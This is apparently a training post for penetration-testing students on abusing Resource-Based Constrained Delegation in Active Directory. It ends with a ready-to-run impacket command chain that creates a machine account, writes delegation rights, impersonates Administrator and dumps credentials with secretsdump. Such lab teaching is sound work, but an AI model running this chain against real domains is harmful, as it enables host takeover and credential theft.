### Content of the Day — Windows/AD Privesc: Resource-Based Constrained Delegation (RBCD)

RBCD abuse is the move you reach for when BloodHound hands you a `GenericWrite`, `GenericAll`, `WriteDacl`, or `WriteOwner` edge over a **computer object** and you want to turn "I can edit this machine's attributes" into "I have a SYSTEM shell on it." Unlike classic constrained delegation (configured on the *front-end* service by a Domain Admin), RBCD flips the trust relationship: the delegation is controlled by the **resource** (the target computer) via its `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute. If you can write that attribute, you decide which principals are allowed to impersonate arbitrary users *to that host* — including `Administrator`. Maps to **MITRE ATT&CK T1098 (Account Manipulation)** for the attribute write and **T1550.003 (Use Alternate Authentication Material: Pass the Ticket)** for cashing in the resulting service ticket.

The chain needs a controlled security principal that holds an SPN — and by default `ms-DS-MachineAccountQuota = 10`, so any domain user can simply mint one. Create a machine account with impacket's `addcomputer.py` (or Powermad's `New-MachineAccount`), then write the delegation with `rbcd.py -action write` (or PowerShell `Set-ADComputer -PrincipalsAllowedToDelegateToAccount`). Now perform the **S4U2Self → S4U2Proxy** dance with `getST.py -impersonate Administrator` to obtain a service ticket for, say, `cifs/target` *as* the DA. Drop that ccache into `KRB5CCNAME` and run `secretsdump.py -k -no-pass` or `wmiexec.py -k -no-pass` against the box. The nuance most people miss: S4U2Self returns a **forwardable** ticket only if the account is trusted to delegate — impacket handles the known `getST` bypass path for you, but it's worth understanding *why* it works when it does.

Two operational gotchas. First, if `MachineAccountQuota = 0` (increasingly common in hardened domains), you can't mint your own SPN-holder — pivot to **Shadow Credentials** (writing `msDS-KeyCredentialLink` on a principal you control, covered last Tuesday) to get a usable identity, or abuse an existing computer account you already own. Second, today's **Kerberos RC4 hardening deadline** doesn't kill RBCD — S4U rides on the account's AES keys just fine — but it *does* raise the cost of the RC4/etype-downgrade tricks that often ride alongside AD attacks, so lean on AES-clean tooling. You'll hit RBCD constantly in **CRTP**, on **HTB** AD boxes, and in the harder **OSCP+ / CPTS** AD sets — anywhere the enumeration turns up "you have write access to a computer object you don't own."

### One Thing to Try

In an authorized lab where you hold write access over a target computer object, run the full chain: `addcomputer.py -computer-name 'EVIL$' -computer-pass 'Passw0rd!' 'lab.local/user:pass'` → `rbcd.py -delegate-from 'EVIL$' -delegate-to 'TARGET$' -action write 'lab.local/user:pass'` → `getST.py -spn cifs/target.lab.local -impersonate Administrator 'lab.local/EVIL$:Passw0rd!'`, then `KRB5CCNAME=Administrator.ccache secretsdump.py -k -no-pass target.lab.local`.
